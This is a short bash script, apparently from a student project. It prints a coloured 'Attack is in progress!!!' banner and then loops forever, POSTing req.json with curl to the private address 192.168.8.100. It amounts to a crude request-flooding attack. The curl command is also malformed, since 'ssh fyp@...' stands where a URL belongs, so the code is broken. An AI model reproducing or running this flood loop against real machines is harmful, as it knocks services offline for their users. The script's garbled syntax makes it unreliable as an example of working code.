Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'

echo "=========================================================="
echo "$Red Attack is in progress!!!"
echo "=========================================================="

while :
do 
	curl -X POST -d @req.json ssh fyp@192.168.8.100
done
